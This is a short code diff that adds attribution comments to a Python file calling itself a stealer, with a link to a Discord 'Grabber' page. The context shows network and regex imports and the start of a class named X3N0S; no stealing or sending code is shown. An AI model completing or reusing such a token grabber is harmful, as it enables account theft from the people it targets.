@@ -1,3 +1,6 @@
+# Original Python Stealer Made by Its-Vichy
+# Original Stealer: https://github.com/Its-Vichy/lets-talk-about-discord/blob/main/Grabber.md
+
 import os, re, threading, urllib.request
 
 class X3N0S:
